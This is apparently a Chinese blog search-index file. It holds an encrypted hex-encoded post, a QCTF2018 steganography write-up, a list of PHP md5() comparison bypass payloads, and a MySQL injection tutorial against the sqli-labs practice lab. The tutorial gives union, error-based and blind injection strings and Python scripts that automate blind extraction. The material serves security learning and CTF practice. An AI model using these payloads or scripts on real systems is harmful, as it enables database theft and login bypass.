6cc52367ac4ba55a89d8bcdea23e0ced3ab7a32282ef7962620f1625d9959dc1b96013a9c79e5584042ba454b9d2950228f18ca4ecddbd7e05a7ce26c4f7d34e58014189f6d3b67035d080f4688e9e1d3ec0d1a8c10c1d76795f11f2bb8858a7d0474c28e154d6c0b2a99457a92ffb95bf86d27e3113cf6db3352d308205bac94e0a7cfa193abab3df92a68f54cd48f26227f747548d00a108464cb6487cf6b7ebe6ac0e00e26759c512636959db0c8b392948766bddc7d956c0ceb862f5ea027193cf38afe6ae60a8e54d51627a587e3ce60934377a8997b957bc8df52fabd6b2deb8f92ac268b5f8566b264ef4f1d73c3db308d36a88a03941e6d59d0029c7b18f284501cea1db5cd3c1f13ff77ebf1959fdffea201bed0cd0970ca6dd0b2d93628f8c3cbb5ed8cdf0a7b7799fff4047d8815bab29e8bda78c39bd60f37315f74b1e655c2527ddf11e92863661d2e297d88134c9aebf1b22aa989c1ace1e25effb524820bc8cc6c883b40d138a02b15da6d2b0e14e371452127d7d1659b72efce31ffedd7e1c9262531712c93e87d969a164592b9b6fea32b18e30e44a6d10c3b12ec7683aa6a4d4f107433b515dd99a1a0bed3370b20bff3badb0ca27faf32f43d4c2c1ebfae8086f39dbecfce525f21fc7743c8c7885fa39a8f4712e67e1506e599cd00e075dc4f24952e54e271556535fccd7cccaf1b6025c80da6be654f8d14b9128b55708ea32039a1eb0b72f583d3fd86838cd3b777bd648fd2ff9e47a111044fd8216d99f0a78782593819dd2358efa55cb02527cb81bcb4363e8a2d9a352edb90bdfe900a5c776888a262656683dce147288ee6a086c22e99184003a3155401473db6b1211b5fd526c134a47ba2ca63d0622ee929656e414087ed008d469c78f9b3985dd71af7b33de6454fa4427a2d45601d376ff4660e835c877865966d00e56cae3732becebcee4eed5d53cdc1080192214634c8fedccb1bcc5afadb9e224196ee359e359d1bf851e26a4e4c03546eaea9dd2aa76fdd370a978f85c728b95edacfba8f509ee36a0e97a2011a4a4fff7512f3bd963c26ece829bdb116a7b45020633dbba922eef76950daae3ccd632feaf15311b6323e7374e1d8d29e7226f454a443eb9ae3275f4f5f1b19add6c3681d1bf898f4d5459606a0925d68fbd14236aab94bd2c59a0060dd5cb0affc1d1b563b6d32849a0fa27990bf7d3928cb51856b59c35c2193b13b660e760014ef7895cb6f45853965d99f40c0e9c8294217034f43ba6a8101ef946e6f491198022f17d36d6376379e19e6b0ca8947dfc1d1fed0054a8de6ac763453f70992263d8b5bc41ccbc524c9db09d1825da01666a69bff5c75f0eaf487674049efe5166d3a77bb55eb1c2f2522b4f7ce791db27ef896953bd18d5dc706279339f2612216d7962e6960d4feaad219daf2e5c1e11b45f68aff506ce269fad24b81dc7c8aa5298da3d46fad81a626f79b0914a422abe87259e01c4dee38fe17e4d3b2ccc3bdded1705ddd67ffdf7b4507f0231427ccfedcc2afb327135909bb36ec51540ba216fcd479e81a7805234c0b464d9b2630453227475f773c07213967421283ce19a7edd59e1c618da4fbcec359a47bbe69d3fb681bac3fb2ba1a81a485dd6681e925394852c724b39183c80ddb66610e2f83b076f1437396f52633fdd2f1c119fc660f95f73f497cd457931f2c67d760963d50a32dfe285d7c391df218845324de5e485d5687395c389dd4455173ef9a0e48d8718589c32d30e1bbedff6108be657fa9151c03ca847d11f805641aaf4c0fda6b1898d62c1aba42bfa1875ce71e15b89a94a1637c901cd8b9d7b0dbbf8c8438421016af58c6cb06c2bb54deb0fa077e42f1fa236efe2035d2b652bdc1817275811aff7427e1ff88cc4bf5b5475fb52b7d0b667897e2f842751cf9d2a8d4d0881dfd28c9e91c38265028376f92b91e5482a247eb220f2f40d099f00707c0e51f87816c2ab1a8fe36bec24eccdd79aab481f1ef7fe2096f98970fcd5edb59a3e73fa36d065a2319aafbd13e7c8cb6f720719dc2707ce575d8db6d717dc7c4bae29bcd6a6352788bbdde95bee372d5f7a655ca984c23554ef8a4a7f54c26bd3ff6ee3c4447e6bd43fa20166e4d8ba0c515c82b58ed9b004abec1f6eb08bf7e0d11b747096a1523a155e9da3df30f119d09b1d371478c17e1aaab84cd83137a9bff9ecee1df364c1ad06970fa6f9af8495c4db408920a4bf6dbe4e4f96857e66a85ef9f527bf013514a7e41fc2bde6e4465fa39fea4548e6eb92075b27a515e04d92eeef9ce3e41a1efd610d01a4433a08bdabef057d5025c8a6b272e7c72e7e03f4cfc0bf30a1dfac5633bebe4cc06c9db0949b1e5dcc595cb0dd49fa096de36da2b3d3642a563db21f05d2f920be68b330d75d0bf0f026cc16b7e493d024babee05917626c1e7252a82f2bcbf08f156a88194a96a6d51b6bc51d6e1c8c46eb30f114529b375b54ad433b2588988acb7a3b216c8696bca74e4f7c2ae6889e46a3c33c2f454acb195f16571fbb4c246f66dc6b2d3f995361fc6a4155b9e14580e8bc00cc202148e2018b4abc7fce6ca8646c2a801db7acdac16cfabec4c40ea35c2077fc1629cdf46fd66ba2cccd8832f640e1a9130d2dd0bbca3116364174cb5259e6aa73de8417da2e162bbb37a2507712cc7b6b290d352a4d67bc70a5beedcde100fecf20d4d31929bffe778b4b11b9186ac004dcf007d916cf6b1ca3ae743c1fcf089a475bfb49f0351b51ac9f63f37ec33bbb68bc9d769d373135499e9a84cfd64c171f0289b4bcaacd508b1e15d3a4facf56f3f762af3dccc21bcb113228208df80d0d31511e4131a8c30ab99ea8c0a2d909c90f589ffb8419e4d2591f6c056cf12fa667f0e1084d9531ad53827a2a6687e14f02f8a16f2c01d9e09b1740e2ea9d531572e7fde817963bca8b6bae4dec21edf9e6de36877f725ff2dd827a1f9aaedddacfcf73b16492c27b672000daed3977cb208c875d2120bb8d1149689e5e23575371cbaf86b01398e545f21d50bef54039684270e4167d64dc145e35d3d03da84625e34a679fce1877af203f1ca974d9a6e60230b9dbe39fb383d2557531a50a47a312485d1a41e1b7528d46f90aeebe001313259e964cb5096e6e8aafcee10cf41a8587865076d982aabad4c602c58ae002ecc6372f6e86dc548bb826252b752e8393cdcc66e53eb89484914edbde9eb44a6d17355ee12565a4ae53858d998dc6fc1cfe6d2c648e31b593fb64c88d8ac11e34ded01011f7bc9fbd562b4d61119bdf1373c5d57dba07d7579032196f34f51d16775ef049a42992231a40b74d2b95abf3e1ca2fe4e1c0d9f80151ecb237272773ef5b44f32d1e3890091307ef681a8e6717a38cfffb9444f8d9e048548d1ade621cd2ea6172997eb1e88031caace2208aa622b9f7c9535c2974a87b4c6c55e16a749294f93b814064def069d3be4d8fc9328d5e34cddc7ab6732308317a18f2c7af1707518aa168f37d1c227f109a32a2b226b809433b250eb41320b7c606907463208f93993002ee1df198848f270655c6e5c538427da957431287a1f2e79911d79187ed2089fbe069161f4c2bf5938c7f3348c748991df88ea054346aeab24d0fd1e2622c5a216bf4a31547dd6a124374ff232e52edfd58c47c21cda06b29f1f169e5b855e9eed1b2b0eb523229abb51805ffe7074807cee55128e9cf925567de27a0d183a7b30e7d0413ca401099827bfdc4f482732afba3d37fc14b26545941a08f9b0e50f563cad11b5605bafb3f8fd193d176bd6d998d8b20a1fd080005ede6910c63abc3b08181b89e1e5f2abcf3434300bed8a916b5dd2744350b80a8996227df89ffdc50076a5db2182e3513fa02e771e259062501438fe51a935357cec2d041525674b980e0701665ccc5465104b0c4d7c0c767c3ac634bd863312cfd107bf02e3a9176d112c1a0574522da24e8331bde881d0ce4f778e7e0d490e44a1475df85983aaef0b8da9327a44c55a7b346a4b930fe395e3a749ad312f7bf01d2d66c6c06cf373b057dbc9f49234b18857ef4fd165d8a7c9f684bf22491e89427f0680059483aa522bbab82593f876258484d0a52a7a77c263dcb06281f94661d5a0fbc1e68656017bc88eabaa5b4769127e7f9c38c48f92420e3ea13e392b06ab5e864e3f4700556baa7809d6761e8a91e524e2e038995558479290fa8e1a0adcf9ade875a869fcf6c1cbaeaf5a6b85eabc5b5a0397f576728ebe68cff4fb2500fce1fbc8daeb60afc206481e596856ddee88fee846b10fcefcede3a5273aa6ccdfa1209b164567d34598fb895497f507346d0a7baa177c002291fbb370fe0141d7eece5b959551bbac85d124f270efb5848d10f36def28c74a89afc6291ea974812c1b86d0256caa13105b837186ddb85e5d61eaca9e2dcf7d7d7792d5ad7aa8b463e77a97abe4e5a55b52c5a42e01d4c3fdc57dcfc952b9bcda7adb91b7bcb88d342b705a3333abe4b5c5630307659ba1123f66837d59eac30a72eb69fe5ea6d7300a92f0b7fe952b1abb9b611a2eae26bd91371db1ae736cbfec0aa77ed08e8fd014166e2b696307ed8e03759c68aa19aa7723662aeb6165383926640e8f4a5d6e11436bcb279fd1303948652763c03dd83eb8fe3059832ef1d4082efe9ffa6179d6e9b51287ae7cbfc1ea41ffc898532bb1467141a3e9c4ddacbb8ea214d14dc7070c8b14ca6ff910406dfc981bcbb7146c937de29dd9d8ce682bb32f86f54d45fd471985b86990d13610ddda45bde4d277839a20728340bf9d4ad456ae78908942d91aa716c9564e9bfd901c873bb7a96564907d0772c5d9616bdb3e4a0fe70fb4a5ed34cad29ab1df3415d0e4634392b27dc821fdd7f0e75635f4017279230dd813adfb9ab4f8352c84db60de57d294e12b278f03aa326ddc9854963f540bdc0fac3f81c8a50ff25f8ac54c9f28b9bc2daaed2642ed63125984fd3d1116daab9a3148e825b7d0db9eb5f904a34d913548454aaa6e3960765526aae8ccdd9824901e33983d3576b8f149643a737d99066218fd4e820d9bdf3279773520dae79e7606181cc5d6de02e71dffe339a779edaabf0aa4c0626938af66542b4f228e694f05acd720c99fb69c983c7a552f6c21eeef513016cb408723e3e3cda1730a76988c8f14a8e7b7299e150cb3e1b4c0111a1521a56bb3eefe3f9552fa4a7c1b99c9a86656db5e670125f38101ec0b3967c3447dde2760b23a9390125d52c1abd7befe6baaae60212f19e341f5968d7a23e26bb5b0ebbddc4fb0528194cd54373d61b456f753aaaf94135cc118841da3cc34d40c2e4b75a3fd36ef980303a5599d7b1c740e204dbdb3a2c9b555577bd795523a5c3094766f0fd05865c392f6d3216b702c8a5b733b61bfb6290550c70d9d1acc61e7af13e40c85af84daa5290256a7e3f8aefcb3452e3ca0d3cd71e1806913edb041a1fabef2a0f761b121e9a4b1e1035a0231dc78ae51b23346bf60a3282856ab552ab18082f32ef47c9471575b12e7f37888c54f2796289554ee3380f9793c5f3c66daf2247100968d0211a584d4d1e0d237c1c3c2ef07f75f069ce7259624297f83a5aad10acb94732f4beede3880d5d423e1e00fabdd5447f3045a239c017544bed9f1a91dc4c40a1199b475b7f58199a86141f3e3c88d6f96b738ed1f27637d57e4f38c888e39d77507e5e9e0693a774320dcf36c7126d9da6b7be062ec12ca868298f7408413f86991b724a90d9a096035ec8e90c90b7a7661861297c46cef8ada9a46a5d782e5375b78911b150d6101ce6c5240776a549fbeb122f487881fbcc259ca6b490ac0594c94c0aa3c47b297bd2e3c70c048ba771336078dc2737613253f8704e18bf38f2d742cc0b81961b79c3849a8fd2b42d2efcb8408809a38430dec584a7d11014d1f7c8cac56fbf26b44e592e2502317368cac7cacc37ec29cf7998a7d72c909be280bdc343e0365274d6daf087b09d53b8876ff25ab9e4350752ca85abae1feddd0c1cf14a2ac312fe844dfb6b0ac08581e7fcfd7585299a140e66a1a9baf83a12eff08cb21698f6e96fa9a4cf7a9235f3c62531e42a6c790bd3b2ffbd829578a897f551efc8103f47b0f420a174ed0468aacee218db5e41a6def49e4d230f2519275d54e8a6a1f09c2f97b4526a5c9f1bd1b39db9b5ffab9ce3ebfde8a4c4cdcf9436ccbc6acbe60e19d35be3b7c9e8e5eadaa75154f6a16bce1b13206f301a7b9007f6c1ea8a156ae65b3d78a83581a9c58d04af869e25ae18d2bfe82a92f515c5d148926cc269c5837e6fdacabbd757e59310e9c8627289e3670625242473f1b0436997b7ed50af04e7585425ae4946b12088a0ebc0d0f520f1b4fe387c241b4415b8b964e68b4f2d6de3654728e49f03f5d3946627e7d86291150ff440329db6fac19ba295fab77151cf47864ef92bf62a73e0f2233d3f83505787b525e0273cf8ba4669bc43da41bd598d8f739b40c93037a2e6223c147d3b64153b52bc898318b88cff24bf27f813b14f61c0dd0fefdc8c3ef40ec0dcf4b9169bd0b3cca906296d39212b89dee76cf05147a4d2ff53c548ab96702bac0113c18bb1bcc0be6f72a12d182faf6cf9c5a5d08c6251025ac9934992f63b18ff8314ee3d144908116d05d6bef82143f5c2759068a03940a5414cb52dff77ca01d89a923e617fa2d8016ed003c0c7f0975c2234ec94402b03a33748b7a5a1c0ffb07cfeaa0d8d66a5c63c53530a02d9d3ff7ee2e877d34dc5dbc97fae225f6a7335c6a065ef28aef07c9463e8785b239bab579a679b33da26059007722e18e380c7a094142c623bb0e9c391056bc443f39d88f144aec4a3734986932e99388a7e5ce2d628bda496a2e1f28bb8a2ae2af95b4ac55e970f83a6fa99d04f6692fcfc665abeb8845c22d48b98f5f9d56495b3ce755a2c053cdc266dafe4289fdada309eeee0cebc7c3d0526d0d4ec35a62584d7c5ac245a3c8d7c6ca546f0f5efdec08eb743665491d6399dab98885e042f6e38633775d3c78718fcb391264adc062ffafc4fe408eb9299934de47a7112cdccaa495b4c2643e0bf20557a6bae534587c1260649a9a3ed57bafcef05be6c2d4516cc26b0dca6a5e96a4021b2e3f8e414532784a187061eea46a25f1fe892a8b20f1650c75716a3ab317388e7010e69cfd74096858416d9cb30bc46dbaaba920a0473c79208868dc73c925c30e810a306b36a32521028edcbe2b782b5ec5e6e41714860fa20244d5dfc0f2d92b11ed11cc48e2b9ad2afb36e946a72c65d65a0e021b1ac0cb2edcbd7ff174d796b6afd21e8720fdbefd0f8c5595c46e5139bb49f235f90cc9de69654c8219acafd83487e013da8e23d31466bc595754a76450f3f1baffb83a65767298e32ba7813fe9806d2431e1d3af067155668dc3d0eccaa2423afd7b61a7b023770ed1282acd21289be4885dab51730f8b9782899348c9ec19204144038ea8334c2ce5f6c42aeb7d2ec188baad8f345b8c67042ab7c8b332e3f57e3c9f569cc177ea60c12c1ad9023fb0c3f70c04be3a06c78b0a622cc53680f20ccd24d6fb5b2243b9852497dbc6d2cebfea1d741a51b35e722fff53a5acd9dbebe8935e58f96c441e45a2a0851110d8a3eaeb469123c473820cfd46fd4469e992c530623cafaab5d2086a75d0e338a36ac32d64f50ce67d9fef1f92b173f50d065ebd6c94a866da980d09c6896b44a3a35bc10685f19bae88b9991399280fd6c9b5bb1562a2f9727f5157e3134c60194c08ff6390e08e1d840a617919a729d548e74221d958d7f15325262f7ffe405514f76d76ec7fc74d81010d4288ba7d4f5fa7da5744f4aa11a2b65071b7fd8815a3ac02bf2c0aba163188890246ddfe8e07fa73da1c7e17b4578b805c0bd3b822778464179c80f41","link":"/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"},{"title":"2.9 [QCTF2018]picture","text":"这道题收获就是得到一个des解密脚本。首先winhex打开发现是png文件经过了许多png隐写的尝试发现是lsb隐写密码为图片中文字的首字母得到一个python脚本，发现是des加密脚本看了别的师傅写的wp发现了一个好用的des解密脚本,然后用这个脚本就可以得到flag解密脚本：链接","link":"/2-9-QCTF2018-picture.html"},{"title":"PHP中的md5()函数绕过总结","text":"一.前言本篇文章记录一下在做ctf题时遇到到的md5()绕过方法。主要分为:1234md5(key,true)；md5()==md5()；md5()===md5()；(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)绕过思路。 二.具体方法1. MD5(key,true)默认md5第二个参数是false。FALSE - 默认 32 字符十六进制数TRUE - 原始 16 字符二进制格式所以当我们传入一些特殊字符后会在浏览器中显示一些关键字，从而实现绕过。两个特殊的字符：1234ffifdyop129581926211651571912466741651878684928ffifdyop：T0Do#'or'8129581926211651571912466741651878684928：'or'6]!r,b。一般传入ffifdyop即可绕过。 2.md5()==md5()这个主要用到弱类型比较，以科学计数法0e开头的，在比较时会自动转换成0从而绕过比较。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020以上就是一些常用的绕过参数，随便找两个传进去就可以绕过。 3.md5()===md5()===强制类型比较，当比较时会比较类型和大小，所以用第二种绕过不了。但是我们可以用数组绕过，当我们传入不符合规定的参数时：md5([1])==md5([2])==error，即error==error从而绕过。 4.(string)key1!==(string)key2&amp;&amp;md5(key1)===md5(key2)这个在比较时强制类型转换成string类型，所以第三种就不可以了。但是这个要求我们传入md5相同但是字符串不相同的两个参数，其实这样的情况是存在的。两条payload：12Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2上面的payload就可以绕过，当然还有很多这样的字符串。注意一下的是在post传参时要urlencode一下。","link":"/PHP%E4%B8%AD%E7%9A%84md5-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html"},{"title":"Mysql注入详解","text":"前言最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。 一.有可显字段——使用常规注入法用到的注入语句：12345678and 1=1 --+and 1=2 --+order by 3 --+union select 1,2,3 --+union select 1,database(),version() --+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(':',username,password)) from users --+)常规的sql注入，通常有可显字段，通过在可显字段进行注入，从而达到注入的方法。以sqli-labs第一关为例用运用常规的sql注入 加入单引号，发现报错，这里我们可以用报错注入的方式。 通过对语句的闭合，发现单引号是sql语句的闭合符号。and 1=1 返回正常and 1=2 返回异常 用order by语句进行数据库的猜解order by 数字 是按照第几列升序排序order by 数字 DESC 是按照第几列降序排序我们用这条语句操作数据库，发现order by 4时报错，因为该数据库没有第四列，所以我们可以用order by语句进行对数据库列的猜解。猜解到该数据库有三列。 猜解可显字段 先将id=1换成id=-1 或者运用其他方式让其报错，在运用union select联合查询语句发现2，3字段是可显字段。 查看当前数据库名和用户名 运用database()，user()两个函数常用的还要version() 来查看数据库版本 猜解表名 group_concat(xxx)这个函数通俗理解就是把xxx字段的数据聚合在一起返回。例如：group_concat(table_name)意思是将table_name字段中的数据全部返回。information_schema这个数据库保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。information_schema是在mysql5.0版本开始使用，像5.0之前的版本要是注入的话，只能像注入access数据库一样，进行猜解。information.schema.tables记录了整个mysql所有的表名table_schema指定数据库名 猜解字段名 爆破字段名和爆破表名一样，只需要更改几个参数即可。爆出来字段名：username，password俩个字段 猜解字段内容 运用2，3可显字段 一块查询username，password字段内容这里用到limit限定语句limit 0,1 意思是查询字段中的第一个内容limit 1,1 查询字段中第二个内容limit 数字，数字 第一个数字指定查询的内容(从0开始)，第二个数字指定返回的数量。不用limit语句也可以，还有一种注入语句1union select 1,2,group_concat(concat_ws(':',username,password)) from users用group_concat()聚合输出使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）所以用上面的语句直接爆出users字段的所以内容。 二.无可显字段，有错误提示——报错注入启动了错误提示，并且出现在了浏览器中，即可运用报错注入 1.Floor语句报错注入用到注入语句：12341' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select concat(username,0x3a,password) from users limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)floor语句报错主要用到：floor()，concat()，count()，rand(),group by(1).floor()函数：floor(x) 向下取整，取小于等于x的最大整数。(2).concat(x,x1,x2):将x，x1，x2整合到一个字符串。(3).count() 返回指定表的行数(4).rand() 随机返回数字(5).group by+列名 按照某列分组先做个实验，使用创建好的一个user表count(*) 用count(*)，group by 联合使用，构建一个虚拟表 floor（rand(0)*2）返回是伪随机，规律是：011011；不给rand（）参数时，返回不确定 使用：1select count(*),concat(floor(rand(0)*2),(select version()))a from user group by x;报出错误： 运用上面的规律：以sqli-labs第一关为例第一关，虽然有可显字段，但是同样开启了错误显示，所以也可以用报错注入报错注入是不用猜解表中的字段有多少列的，所以我们直接用一开始给出的语句进行报错 爆当前的数据库名爆表名 爆字段名 爆字段内容 floor语句报错下面的几条博客不错1234567https://blog.csdn.net/he_and/article/details/80455884https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirecthttps://www.cnblogs.com/litlife/p/8472323.htmlhttps://blog.csdn.net/Fly_hps/article/details/79416620 2.extractvalue()函数报错注入用到的注入语句：12341' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)) --+extractvalue()用于对查询xml文档的函数有两个参数，其中第二个参数是可操作的地方 第二个参数必须是 /xxx/xxx/xxx/…这种格式，要不就报错，所以基于这个特性，可以进行报错注入以sqli-labs第五关为例：开启了错误提示 可以使用报错注入然后用上面的注入语句进行注入： updatexml()函数报错注入用到的注入语句：12341' and updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select column_name from information_schema.cloumns where table_name='users' limit 0,1),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),0x7e) --+updatexml()函数与extractvalue()类似，是更新xml文档的函数。updatexml()有三个参数，其中第二个参数可操作 ，是xml的路径 必须是/xx/xx这种格式的 ，所以和上一个类似，构造注入语句以sqli-labs第五关为例：用上面的注入语句爆出数据版本爆出表名爆出字段名爆出字段内容 extractvalue()和updatexml()报错注入参考文章： https://blog.csdn.net/zpy1998zpy/article/details/80631036 报错注入的语句还有很多，但是主要还是上面三种，其他的语句和上面三种类似其他报错注入文章：https://www.cnblogs.com/wocalieshenmegui/p/5917967.html 三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面这类注入利用属于盲注中的布尔盲注，在无可显字段无错误提示，但数据提交正确和错误两种不同页面时使用。有时在不能使用union select语句时，也会使用这类盲注。用的函数：12345678910111213141516171819202122- Length（）//返回字符串的长度Length（abc）返回3，表示abc字符串长度为3 - Substr（）//截取字符串Stbstr(abc,1,1) 返回a，从abc的第一位开始截，步长为1。 - mid() //取出字符串的一部分值mid(abc,1,1) 返回a，从abc的第一位开取，步长为1.与substr（）用法一致 - left() //取出字符串左边的几个数据left(abc,1) 返回aleft(abc,2) 返回ab - right() //取出右边的几个数据right(abc,1) 返回cright(abc,2) 返回bc - ord（）与 ascii（）//返回一个字符的ascii码值ascii(s) 返回114 - hex（） //返回16进制数用到的注入语句：1234length(database())&gt;7ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&gt;117ascii(substr((select username from users limit 0,1),1,1))&gt;6不需要union select 即可完成注入工作 以sqli-labs第八章为例 python脚本如下：1234567891011121314151617181920212223242526272829303132333435363738import requestsdef database_len(): for i in range(9999): url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and length(database())&gt;%s''' %i #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: print(i) else: print('database_length:',i) breakdatabase_len()def database_name(): databasename='' for i in range(1,9): for j in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz': url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and substr(database(),%d,1) = '%s' ''' %(i,j) #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: databasename += j print(databasename) break print(&quot;database_name:&quot;,databasename.lower())database_name()def table_length(): for j in range(9999): url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;%s''' %j r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: print(j) else: print('firs table length:',j) breaktable_length()我只写了猜测当前数据库的长度，数据库名，第一张表的长度。剩下的都一样这里不在给出！123布尔盲注参考：https://blog.csdn.net/qq_41554179/article/details/88414079https://blog.csdn.net/Wu000999/article/details/100041049 四.无可显字段无错误提示，正确错误没有明显区别这类的sql注入类型，可以利用的方式是时间盲注。时间盲注又叫延迟注入，通过时间长短来判断是否执行成功。用到函数和布尔盲注差不多。if(条件，1，2) 如果条件满足，则执行1，不满足就执行2sleep(2) 延迟2秒钟用到的语句就多了上面两条注入语句：1234if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;11),sleep(2),1) --+if((ascii(substr((select column_name from information_schema.tables where table_name=‘users’ limit 0,1),1,1))&gt;11),sleep(2),1) --+ if((ascii(substr((select username from users limit 0,1),1,1))&gt;11),sleep(2),1) --+根据上面的语句构造python脚本：1234567891011121314151617181920212223242526272829303132333435import requestsimport datetimeimport timedef database_len(): for i in range(1,10): url='''http://127.0.0.1/sqli/Less-9/''' payload='''?id=1' and if(length(database())=%d,sleep(2),1)''' %i #print(url+payload+' --+ ') time1=datetime.datetime.now() r=requests.get(url+payload+' --+ ') time2=datetime.datetime.now() l=(time2-time1).seconds if l&gt;=2: print('database_len:',i) break #else: # print(i) # breakdatabase_len()def database_name(): name = '' for j in range(1, 9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = '''http://127.0.0.1/sqli/Less-9/''' payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (j,i) time1 = datetime.datetime.now() r = requests.get(url + payload + ' --+ ') time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec &gt;= 2: name += i print(name) break print('database_name:', name)database_name()这个脚本中猜解了数据库的长度和名称，其他的猜解和这个基本一致。 五.post注入post注入其实就是注入位置的不同，其他的注入利用方式和前面的基本一致。主要是用到Burp Suite 进行抓包我们以sqli-labs第11关为例：用的注入语句：1234567' and 1=1 %23' order by 2 %23' union select 1,2 %23' union select database(),user() %23' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() %23' union select group_concat(column_name),2 from information_schema.columns where table_name='users' %23' union select username,password from users limit 0,1%23用burp抓包 发送到repeated模块加个单引号爆出错误判断字段数判断可显字段爆出数据库的表名爆字段名爆字段的内容 这里指举了一个很简单的例子，还有很多注入 其实post注入和get注入利用方式是一样的只不过是注入位置的不同。 六.insert，delete，update注入这些注入基本利用方式和上面的一样，只是注入位置的差别。insert语句用于向数据库插入数据-&gt;一般用在用户注册中，delete语句用于删除数据库的数据-&gt;比如删除留言板的数据update语句用于更新数据库的数据-&gt;比如修改用户信息123456insert into users(id,username,passowrd) values (2,''1'','Da4er);UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值DELETE FROM 表名称 WHERE 列名称 = 值这类的注入不在给出例子 